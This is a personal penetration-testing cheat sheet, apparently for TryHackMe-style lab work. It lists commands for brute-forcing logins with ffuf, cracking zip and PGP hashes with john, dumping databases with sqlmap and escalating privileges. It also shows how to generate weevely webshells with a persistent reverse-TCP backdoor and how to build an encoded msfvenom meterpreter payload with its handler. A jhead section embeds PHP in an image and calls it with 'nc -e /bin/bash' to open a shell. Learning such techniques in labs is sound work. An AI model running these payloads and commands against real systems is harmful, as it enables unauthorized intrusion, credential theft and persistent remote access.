
### bruteforce using ffuf

`ffuf -w <user_file>:W1,<password_file>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <URL> -fc 200`

eg. `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.141.165/customers/login -fc 200`

### vscode:

`shift + command + F` searches for selected text in all files

### generic recursive search for a file, no error flood

`find / -name flag.txt 2>/dev/null`


### history cut to get only the commands

`history | cut -d " " -f 5`

### find SUID binaries unprivileged

`find / -user root -perm /4000 2>/dev/null` for SUID binaries owned by root

`find / -perm -u=s 2>/dev/null` for SUID binaries owned by any user

usually suffices to find SUID binaries (does not use sudo - eg. sudo -l )

### gobuster no tls verification - just disable it

`gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirb/common.txt -x js,php,txt -k`

### ftp get all files

`mget *`

### steganography file extraction #stego

`binwalk -e <file>`

### stego password protected file

first verify there is something `steghide info cute-alien.jpg`

then extract it `steghide extract -sf cute-alien.jpg`

### zip password bruteforce

`zip2john 8702.zip > zip.hash && john zip.hash`

### download file from target

target: `python3 -m http.server 8000`

attacker: `wget http://TARGET_IP:8000/flag.txt`

does not matter where the file is

### SQL injection when it does not work but should

1) capture the request in burpsuite
2) go to burp's http history and save it as xml
3) sqlmap -r request.xml [+ whatever options you want - eg. --dbs then --tables then --dump]

### bin -> dec -> hex -> ascii conversion does not work in CyberChef

do it in an online converter or python - eg.  you do this:

```python
# not str -> str like CyberChef does but working with numbers
binary = str('binary_number') # bin
decimal = int(b, 2) # bin -> dec
# now you can continue online or in cyberchef
# or python:
hexadecimal = hex(d)[2:] # bin -> dec -> hex
result = bytes.fromhex(h).decode('ASCII') # result
print(result)
```

### four character lowercase alpha passwords from rockyou

`cat /usr/share/wordlists/rockyou.txt | egrep '^[a-z]{4}$' > four.txt`

### upgrade shell

1) `python3 -c 'import pty; pty.spawn("/bin/bash")'`
2) Ctrl + z
3) `stty raw -echo; fg`

### web hacked - revshell but where next?
try `/var/www/html` to find some config files

### rev.py

just copy the revshells.com python#2 shell and format it normally
(I can't put it here as it would get flagged as malware)

### very cool cheatsheet for AD (not mine)

[ultra comprehensive AD cheatsheet](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

hope they make more of these, it's that good stuff

### RDP

`xfreerdp /u:Administrator /p:password /v:111.222.333.444 /dynamic-resolution`

### powershell - how to survive powershell

`gal` or `Get-Alias` to see all aliases (commands that are understandable for UNIX users)
scroll through the list and pray to all gods you know, that you find what you need

else, feel its wrath and a cold presence will form behind your back. Do not look behind you. If you do, your eyes will have the windows logo burned into your retinas and you will have to say "I invoke command ..." for every task of your day. If you fail to do so, you will leave this reality for a place far more desolate than anything you've experienced. No one knows what happens to those who do, but it sure is not pleasant.

anyways . . .


### kali stuff

`cd /` to go to root directory and `cd ~` to go to home directory

`cd /usr/share && ls` here are most of your tools (+ wordlists)
 - eg. `/usr/share/wordlists/`, `/usr/share/webshells/`

### weird escalation vectors

forget `sudo -l` and `find -perm -u=s 2>/dev/null`

`id` - weird groups - eg. if you find `docker` you can get free root (GTFObins - search docker, if the 'alpine' thing is not found, replace it with 'bash')

### weevely

`man weevely` - weaponized webshells

`weevely generate bedbug wish.php` - generates a webshell called wish.php with password bedbug

`cat wish.php` - you see it's hard to read

usage:
 - upload it to the target (web)
 - `weevely http://TARGET_IP/wish.php bedbug` - connect to the webshell
 - `:help` - see all commands
 - `:system_info`
 - `:backdoor_reversetcp TARGET_IP 4444` - reverse shell, persistent, catch it with `nc -lp 4444`

### msfvenom

generate the shell:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -e x86/shikata_ga_nai -f exe > shell.exe`

there are many more formats (-p), eg.
 - python/meterpreter/reverse_tcp
 - java/jsp_shell_reverse_tcp (for .jsp webshells)


upload it and `chmod +x shell.exe` to make it executable


catch the shell:

`msfconsole`

`use exploit/multi/handler` - same for any format

`set payload windows/meterpreter/reverse_tcp` - has to be the same as the one generated

`set lhost YOUR_IP`

`set lport YOUR_PORT`

`run`

### jhead

inject php into an image as metadata

usage steps:

```

jhead -purejpg myimage.jpg #removes all metadata

jhead -ce myimage.jpg #shows all metadata for editing

#now we remove the comment and add our code

#rename the file to something.php

mv myimage.jpg myimage.php.jpg

#upload it and access it like this (to execute )

http://TARGET_IP/myimage.php.jpg?cmd=nc -lvnp 2222 -e /bin/bash

nc -lvnp 2222 #to catch it
```

### installing python packages on kali (pain)

I use uv tool to manage packages

[basic uv cheatsheet](`https://0xdf.gitlab.io/cheatsheets/uv`)

### AD

basic commands in my writeup: `Cybersec/THM_JR_Penetration_Tester/AD-Basic+Authenticated_Enumeration.md`

[AD enum writeup link]('https://frajer.gitbook.io/tryhackme/cybersec/thm_jr_penetration_tester/ad-basic+authenticated_enumeration')

### leaked pgp key

in this case we found ***tryhackme.asc***, which is a pgp key and we have ***credential.pgp*** that's been encrypted with it.

`gpg2john tryhackme.asc > pgp_hash.txt` - make it johnable

`john --wordlist=/usr/share/wordlists/rockyou.txt pgp_hash.txt` - crack it

`gpg --import tryhackme.asc` - import the key

`gpg --decrypt credential.pgp` - decrypt by entering the password